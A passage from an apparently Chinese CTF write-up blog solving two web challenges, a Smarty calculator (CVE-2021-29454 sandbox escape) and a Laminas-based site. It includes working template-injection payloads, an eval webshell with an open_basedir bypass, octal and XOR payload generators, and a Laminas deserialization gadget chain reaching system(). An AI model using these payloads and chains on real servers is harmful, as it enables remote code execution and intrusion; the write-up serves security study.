<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052041485.png" alt></p>
<p>接着尝试google搜索相关poc，发现还是存在漏洞的，这里找到官方源码，与题目给的进行对比看看：去github下载源文件<code>https://github.com/smarty-php/smarty/releases/tag/v3.1.39</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052041486.png" alt></p>
<p>可以看到这里对正则的表达式进行了修改，问一下GPT，发现题目给的正则表达式匹配情况如下：</p>
<p>这个正则表达式要求字符串至少以一个 <code>[a-zA-Z0-9_\x80-\xff]</code> 中的字符开头，然后可以跟随任意字符（包括空字符串），直到字符串的结尾。</p>
<ul>
<li>匹配的字符串：<code>a123</code>, <code>éxample</code>, <code>test_string</code>, <code>ü1234abc</code></li>
<li>不匹配的字符串： <code>123</code>, <code>-test</code>, <code>@name</code></li>
</ul>
<p>这意味着我们可以通过8进制绕过，不过在此之前还有很多绕过方式，如下图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052041487.png" alt></p>
<p>再结合上述正则表达式，我们需要绕过正则，否则会进入error。因为<code>(.*)+</code>，<code>.</code>匹配<code>除了换行符</code>以外的所有字符，<code>*</code>匹配0次或者多次，<code>+</code>匹配一次或者多次</p>
<p>所以可以换行绕过，<code>%0A</code>既不在前面的<code>[]</code>匹配里面，又不被后面的<code>.</code>匹配，所以我们只需要在原来的poc基础上，加上回车绕过，即可执行</p>
<pre><code class="hljs scss">data={function+name='<span class="hljs-built_in">rce</span>(){};<span class="hljs-built_in">system</span>("id");function%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A'}{/function}</code></pre>
<p>剩下就是找flag，这道题没有在根目录，反而在/var/www/flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052041488.png" alt></p>
<p>至于我看到很多wp说这里还进行了disable_functions和open_basedir的限制，不过我们只需要chdir绕过即可。（我上面由于直接调用的system，并不是用的PHP的eval函数，因此没有限制）</p>
<pre><code class="hljs scss">data={function+name='<span class="hljs-built_in">rce</span>(){};<span class="hljs-built_in">system</span>("id");<span class="hljs-keyword">@eval</span>($_POST[<span class="hljs-number">1</span>]);function%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A'}{/function}&amp;<span class="hljs-number">1</span>=<span class="hljs-built_in">mkdir</span>('hybcx');<span class="hljs-built_in">chdir</span>('hybcx');<span class="hljs-built_in">ini_set</span>('open_basedir','..');<span class="hljs-built_in">chdir</span>('..');<span class="hljs-built_in">chdir</span>('..');<span class="hljs-built_in">chdir</span>('..');<span class="hljs-built_in">chdir</span>('..');<span class="hljs-built_in">chdir</span>('..');<span class="hljs-built_in">chdir</span>('..');<span class="hljs-built_in">chdir</span>('..');<span class="hljs-built_in">chdir</span>('..');<span class="hljs-built_in">ini_set</span>('open_basedir','/');<span class="hljs-built_in">var_dump</span>(file_get_contents('/flag'));</code></pre>
<p>还有其他师傅的math eval绕过，注意<code>function.math.php</code>这个文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052041489.png" alt></p>
<p>首先定义了很多有效函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052041490.png" alt></p>
<p>然后对其中params里的equation做了一些判断</p>
<p>然后如下图所示，经过正则的匹配，拼接到了eval函数中，但我们可以用八进制来绕过</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052041492.png" alt></p>
<p>借用师傅的脚本</p>
<pre><code class="hljs python"><span class="hljs-comment"># python3.8</span>

<span class="hljs-comment">#str = '("file_put_contents")("/var/www/html/1.php","&lt;?php eval($_POST[1]);?&gt;")'</span>
<span class="hljs-built_in">str</span> = <span class="hljs-string">'("system")("whoami")'</span>
string = <span class="hljs-string">''</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:
    <span class="hljs-comment">#print(i)</span>
    <span class="hljs-keyword">if</span> i == <span class="hljs-string">'"'</span>:
        string += <span class="hljs-string">'\\"'</span>
        <span class="hljs-keyword">continue</span>
    <span class="hljs-keyword">if</span> i == <span class="hljs-string">'('</span>:
        string += <span class="hljs-string">'('</span>
        <span class="hljs-keyword">continue</span>
    <span class="hljs-keyword">if</span> i == <span class="hljs-string">')'</span>:
        string += <span class="hljs-string">')'</span>
        <span class="hljs-keyword">continue</span>
    <span class="hljs-keyword">if</span> i == <span class="hljs-string">','</span>:
        string += <span class="hljs-string">','</span>
        <span class="hljs-keyword">continue</span>
    string += <span class="hljs-string">'\\\\'</span> + <span class="hljs-built_in">oct</span>(<span class="hljs-built_in">ord</span>(i))[<span class="hljs-number">2</span>:]


<span class="hljs-built_in">print</span>(string)</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052041493.png" alt></p>
<p>如上图所示，成功利用，接下来直接写文件，蚁剑连接即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052041494.png" alt></p>
<p>除此之外还有一种复杂的利用方式，具体可以参考第四篇文章，这个是可以复现成功的（针对phpinfo），进一步的话应该还是要写文件（当我我直接cat /flag没反应，现在反应过来是disable_function和base_dir）</p>
<pre><code class="hljs python"><span class="hljs-comment"># -*-encoding:utf-8-*-</span>

<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> Counter

rec = {}
var = {}


<span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">a, b</span>):
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a) ^ <span class="hljs-built_in">ord</span>(b))


<span class="hljs-keyword">def</span> <span class="hljs-title function_">expand</span>(<span class="hljs-params">s</span>):
    keys = <span class="hljs-built_in">list</span>(rec.keys())
    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> keys:
        t = xor(s, c)
        <span class="hljs-keyword">if</span> t <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> rec.keys():
            rec[t] = rec[s] + rec[c]


<span class="hljs-keyword">def</span> <span class="hljs-title function_">expand_all</span>():
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):
        rec[<span class="hljs-built_in">str</span>(i)] = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">str</span>(i))
    rec[<span class="hljs-string">"E"</span>] = [<span class="hljs-string">"E"</span>]
    rec[<span class="hljs-string">"."</span>] = [<span class="hljs-string">"..."</span>]
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):
        expand(random.choice(<span class="hljs-built_in">list</span>(rec.keys())))

    <span class="hljs-comment"># improve</span>
    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> rec.keys():
        c = Counter(rec[k])
        rec[k] = [_ <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> c.keys() <span class="hljs-keyword">if</span> c[_] % <span class="hljs-number">2</span>]


<span class="hljs-keyword">def</span> <span class="hljs-title function_">init</span>():
    expand_all()
    
    <span class="hljs-comment"># create symbol table</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):
        c = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">'a'</span>)+i)
        var[<span class="hljs-built_in">str</span>(i)] = <span class="hljs-string">f"((<span class="hljs-subst">{c}</span>.<span class="hljs-subst">{c}</span>)[0])"</span>
    var[<span class="hljs-string">"E"</span>] = <span class="hljs-string">"((exp(100).b)[15])"</span> <span class="hljs-comment">#exp(100)==2.6881171418161E+43</span>
    var[<span class="hljs-string">"..."</span>] = <span class="hljs-string">"((exp(100).b)[1])"</span>  <span class="hljs-comment"># point =&gt; .</span>


<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_code</span>(<span class="hljs-params">cmd</span>):
    code = [<span class="hljs-string">f"(<span class="hljs-subst">{<span class="hljs-string">'^'</span>.join(rec[c])}</span>)"</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> cmd]
    <span class="hljs-keyword">return</span> <span class="hljs-string">"."</span>.join(code)


<span class="hljs-keyword">def</span> <span class="hljs-title function_">replace_var</span>(<span class="hljs-params">code</span>):
    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> var.keys():
        code = code.replace(c, var[c])
    <span class="hljs-keyword">return</span> code


<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_exp</span>(<span class="hljs-params">expr</span>):
    var_expr = [<span class="hljs-string">"="</span>.join((<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">'a'</span>)+i), <span class="hljs-built_in">str</span>(i))) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)]
    <span class="hljs-keyword">return</span> <span class="hljs-string">'string: {math equation="%s" %s}'</span> % (expr, <span class="hljs-string">" "</span>.join(var_expr))


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    init()

    func = replace_var(generate_code(<span class="hljs-string">"phpinfo"</span>))
    payload = generate_exp(<span class="hljs-string">f"(<span class="hljs-subst">{func}</span>)()"</span>)
    <span class="hljs-built_in">print</span>(payload)</code></pre>
<h3 id="参考文章">参考文章</h3>
<p><a target="_blank" rel="noopener" href="https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html"># Smarty Template Engine Multiple Sandbox Escape PHP Code Injection Vulnerabilities</a><br>
<a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/123750375"># 红明谷2022 web Smarty Calculator</a><br>
<a target="_blank" rel="noopener" href="http://www.andynoel.xyz/?m=202203">## 漏洞利用实例——红明谷 2022 | Smarty calculator</a><br>
<a target="_blank" rel="noopener" href="https://250.ac.cn/2022/03/22/CVE-2021-29454/#%E5%A4%8D%E7%8E%B0">CVE-2021-29454 Smarty沙箱逃逸</a></p>
<h2 id="fan-website">Fan Website</h2>
<p>这个题目猜测是环境部署问题，找不到源码所在。因此直接找网上展示的了。</p>
<p>正常来说，能发现www.zip审计代码，然后能发现下图位置：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052041495.png" alt></p>
<p>可以发现是laminas框架，版本是2.11，搜一下能搜到对应的链子：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8975?time__1311=n4%2BxnD0DcDRDgD0xCq7KqGNnpYOQoG%3DWttGbhk4D#toc-0">Zend FrameWork Pop Chain</a></p>
<p>这里我选择RCE2链子</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Laminas</span>\<span class="hljs-title class_">View</span>\<span class="hljs-title class_">Resolver</span>{
    <span class="hljs-title class_">class</span> <span class="hljs-title class_">TemplateMapResolver</span>{
        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">map</span> = ["<span class="hljs-title class_">setBody</span>"=&gt;"<span class="hljs-title class_">system</span>"];
    }
}
<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Laminas</span>\<span class="hljs-title class_">View</span>\<span class="hljs-title class_">Renderer</span>{
    <span class="hljs-title class_">class</span> <span class="hljs-title class_">PhpRenderer</span>{
        <span class="hljs-title class_">private</span> $<span class="hljs-title class_">__helpers</span>;
        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-variable language_">$this</span>-&gt;__helpers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">\Laminas\View\Resolver\TemplateMapResolver</span>();
        }
    }
}


<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Laminas</span>\<span class="hljs-title class_">Log</span>\<span class="hljs-title class_">Writer</span>{
    <span class="hljs-title class_">abstract</span> <span class="hljs-title class_">class</span> <span class="hljs-title class_">AbstractWriter</span>{}

    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Mail</span> <span class="hljs-title class_">extends</span> <span class="hljs-title class_">AbstractWriter</span>{
        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">eventsToMail</span> = ["<span class="hljs-title class_">ls</span>"];  
        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$subjectPrependText</span> = <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$mail</span>;
        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-variable language_">$this</span>-&gt;mail = <span class="hljs-keyword">new</span> <span class="hljs-title class_">\Laminas\View\Renderer\PhpRenderer</span>();
        }
    }
}

<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Laminas</span>\<span class="hljs-title class_">Log</span>{
    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Logger</span>{
        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">writers</span>;
        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-variable language_">$this</span>-&gt;writers = [<span class="hljs-keyword">new</span> <span class="hljs-title class_">\Laminas\Log\Writer\Mail</span>()];
        }
    }
}


<span class="hljs-keyword">namespace</span>{
$<span class="hljs-title class_">a</span> = <span class="hljs-title class_">new</span> \<span class="hljs-title class_">Laminas</span>\<span class="hljs-title class_">Log</span>\<span class="hljs-title class_">Logger</span>();
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));
}</code></pre>
<p>这个框架的路由一般在<code>/module/Application/config/module.config.php</code>中</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052041496.png" alt></p>
<p>所以我们访问一下<code>http://your-ip/public/index.php/application[/:action]</code>就可以顺利访问到这个<code>Action</code></p>
<p>在本题目中，<code>/module</code>目录下有两个文件夹，一个是<code>Application</code>，一个是<code>Album</code>，查看<code>/module/src/Controller/AlbumController.php</code></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Album</span>\<span class="hljs-title class_">Controller</span>;

<span class="hljs-keyword">use</span> <span class="hljs-title">Album</span>\<span class="hljs-title">Model</span>\<span class="hljs-title">AlbumTable</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">Laminas</span>\<span class="hljs-title">Mvc</span>\<span class="hljs-title">Controller</span>\<span class="hljs-title">AbstractActionController</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">Laminas</span>\<span class="hljs-title">View</span>\<span class="hljs-title">Model</span>\<span class="hljs-title">ViewModel</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">Album</span>\<span class="hljs-title">Form</span>\<span class="hljs-title">AlbumForm</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">Album</span>\<span class="hljs-title">Form</span>\<span class="hljs-title">UploadForm</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">Album</span>\<span class="hljs-title">Model</span>\<span class="hljs-title">Album</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AlbumController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractActionController</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-comment">// Add this property:</span>
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$table</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$white_list</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">AlbumTable <span class="hljs-variable">$table</span></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;table = <span class="hljs-variable">$table</span>;
        <span class="hljs-comment">//白名单设置</span>
        <span class="hljs-variable language_">$this</span>-&gt;white_list = <span class="hljs-keyword">array</span>(<span class="hljs-string">'.jpg'</span>,<span class="hljs-string">'.jpeg'</span>,<span class="hljs-string">'.png'</span>);
    }
    <span class="hljs-comment">//默认主页</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">indexAction</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ViewModel</span>([
            <span class="hljs-string">'albums'</span> =&gt; <span class="hljs-variable language_">$this</span>-&gt;table-&gt;<span class="hljs-title function_ invoke__">fetchAll</span>(),
        ]);
    }
    <span class="hljs-comment">//添加信息</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addAction</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable">$form</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AlbumForm</span>();
        <span class="hljs-variable">$form</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">'submit'</span>)-&gt;<span class="hljs-title function_ invoke__">setValue</span>(<span class="hljs-string">'Add'</span>);

        <span class="hljs-variable">$request</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRequest</span>();

        <span class="hljs-keyword">if</span> (! <span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">isPost</span>()) {
            <span class="hljs-keyword">return</span> [<span class="hljs-string">'form'</span> =&gt; <span class="hljs-variable">$form</span>];
        }

        <span class="hljs-variable">$album</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Album</span>();
        <span class="hljs-variable">$form</span>-&gt;<span class="hljs-title function_ invoke__">setInputFilter</span>(<span class="hljs-variable">$album</span>-&gt;<span class="hljs-title function_ invoke__">getInputFilter</span>());
        <span class="hljs-variable">$form</span>-&gt;<span class="hljs-title function_ invoke__">setData</span>(<span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">getPost</span>());

        <span class="hljs-keyword">if</span> (! <span class="hljs-variable">$form</span>-&gt;<span class="hljs-title function_ invoke__">isValid</span>()) {
            <span class="hljs-keyword">return</span> [<span class="hljs-string">'form'</span> =&gt; <span class="hljs-variable">$form</span>];
        }

        <span class="hljs-variable">$album</span>-&gt;<span class="hljs-title function_ invoke__">exchangeArray</span>(<span class="hljs-variable">$form</span>-&gt;<span class="hljs-title function_ invoke__">getData</span>());
        <span class="hljs-variable language_">$this</span>-&gt;table-&gt;<span class="hljs-title function_ invoke__">saveAlbum</span>(<span class="hljs-variable">$album</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">redirect</span>()-&gt;<span class="hljs-title function_ invoke__">toRoute</span>(<span class="hljs-string">'album'</span>);
    }

    <span class="hljs-comment">//修改信息</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">editAction</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable">$id</span> = (<span class="hljs-keyword">int</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">params</span>()-&gt;<span class="hljs-title function_ invoke__">fromRoute</span>(<span class="hljs-string">'id'</span>, <span class="hljs-number">0</span>);

        <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> === <span class="hljs-variable">$id</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">redirect</span>()-&gt;<span class="hljs-title function_ invoke__">toRoute</span>(<span class="hljs-string">'album'</span>, [<span class="hljs-string">'action'</span> =&gt; <span class="hljs-string">'add'</span>]);
        }

        <span class="hljs-comment">// Retrieve the album with the specified id. Doing so raises</span>
        <span class="hljs-comment">// an exception if the album is not found, which should result</span>
        <span class="hljs-comment">// in redirecting to the landing page.</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-variable">$album</span> = <span class="hljs-variable language_">$this</span>-&gt;table-&gt;<span class="hljs-title function_ invoke__">getAlbum</span>(<span class="hljs-variable">$id</span>);
        } <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">redirect</span>()-&gt;<span class="hljs-title function_ invoke__">toRoute</span>(<span class="hljs-string">'album'</span>, [<span class="hljs-string">'action'</span> =&gt; <span class="hljs-string">'index'</span>]);
        }

        <span class="hljs-variable">$form</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AlbumForm</span>();
        <span class="hljs-variable">$form</span>-&gt;<span class="hljs-title function_ invoke__">bind</span>(<span class="hljs-variable">$album</span>);
        <span class="hljs-variable">$form</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">'submit'</span>)-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(<span class="hljs-string">'value'</span>, <span class="hljs-string">'Edit'</span>);

        <span class="hljs-variable">$request</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRequest</span>();
        <span class="hljs-variable">$viewData</span> = [<span class="hljs-string">'id'</span> =&gt; <span class="hljs-variable">$id</span>, <span class="hljs-string">'form'</span> =&gt; <span class="hljs-variable">$form</span>];

        <span class="hljs-keyword">if</span> (! <span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">isPost</span>()) {
            <span class="hljs-keyword">return</span> <span class="hljs-variable">$viewData</span>;
        }

        <span class="hljs-variable">$form</span>-&gt;<span class="hljs-title function_ invoke__">setInputFilter</span>(<span class="hljs-variable">$album</span>-&gt;<span class="hljs-title function_ invoke__">getInputFilter</span>());
        <span class="hljs-variable">$form</span>-&gt;<span class="hljs-title function_ invoke__">setData</span>(<span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">getPost</span>());

        <span class="hljs-keyword">if</span> (! <span class="hljs-variable">$form</span>-&gt;<span class="hljs-title function_ invoke__">isValid</span>()) {
            <span class="hljs-keyword">return</span> <span class="hljs-variable">$viewData</span>;
        }

        <span class="hljs-variable language_">$this</span>-&gt;table-&gt;<span class="hljs-title function_ invoke__">saveAlbum</span>(<span class="hljs-variable">$album</span>);

        <span class="hljs-comment">// Redirect to album list</span>
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">redirect</span>()-&gt;<span class="hljs-title function_ invoke__">toRoute</span>(<span class="hljs-string">'album'</span>, [<span class="hljs-string">'action'</span> =&gt; <span class="hljs-string">'index'</span>]);
    }

    <span class="hljs-comment">//删除信息</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deleteAction</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable">$id</span> = (<span class="hljs-keyword">int</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">params</span>()-&gt;<span class="hljs-title function_ invoke__">fromRoute</span>(<span class="hljs-string">'id'</span>, <span class="hljs-number">0</span>);
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$id</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">redirect</span>()-&gt;<span class="hljs-title function_ invoke__">toRoute</span>(<span class="hljs-string">'album'</span>);
        }

        <span class="hljs-variable">$request</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRequest</span>();
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">isPost</span>()) {
            <span class="hljs-variable">$del</span> = <span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">getPost</span>(<span class="hljs-string">'del'</span>, <span class="hljs-string">'No'</span>);

            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$del</span> == <span class="hljs-string">'Yes'</span>) {
                <span class="hljs-variable">$id</span> = (<span class="hljs-keyword">int</span>) <span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">getPost</span>(<span class="hljs-string">'id'</span>);
                <span class="hljs-variable language_">$this</span>-&gt;table-&gt;<span class="hljs-title function_ invoke__">deleteAlbum</span>(<span class="hljs-variable">$id</span>);
            }

            <span class="hljs-comment">// Redirect to list of albums</span>
            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">redirect</span>()-&gt;<span class="hljs-title function_ invoke__">toRoute</span>(<span class="hljs-string">'album'</span>);
        }

        <span class="hljs-keyword">return</span> [
            <span class="hljs-string">'id'</span>    =&gt; <span class="hljs-variable">$id</span>,
            <span class="hljs-string">'album'</span> =&gt; <span class="hljs-variable language_">$this</span>-&gt;table-&gt;<span class="hljs-title function_ invoke__">getAlbum</span>(<span class="hljs-variable">$id</span>),
        ];
    }


    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">imgdeleteAction</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable">$request</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRequest</span>();
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">getPost</span>()[<span class="hljs-string">'imgpath'</span>])){
            <span class="hljs-variable">$imgpath</span> = <span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">getPost</span>()[<span class="hljs-string">'imgpath'</span>];
            <span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$imgpath</span>,-<span class="hljs-number">4</span>,<span class="hljs-number">4</span>);
            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$base</span>,<span class="hljs-variable">$this</span>-&gt;white_list)){     <span class="hljs-comment">//白名单</span>
                <span class="hljs-comment">//反序列化触发点</span>
                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$imgpath</span>);
            }<span class="hljs-keyword">else</span>{
                <span class="hljs-keyword">echo</span> <span class="hljs-string">'Only Img File Can Be Deleted!'</span>;
            }
        }
    }
    <span class="hljs-comment">//图片上传</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">imguploadAction</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable">$form</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UploadForm</span>(<span class="hljs-string">'upload-form'</span>);

        <span class="hljs-variable">$request</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRequest</span>();
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">isPost</span>()) {
            <span class="hljs-comment">// Make certain to merge the $_FILES info!</span>
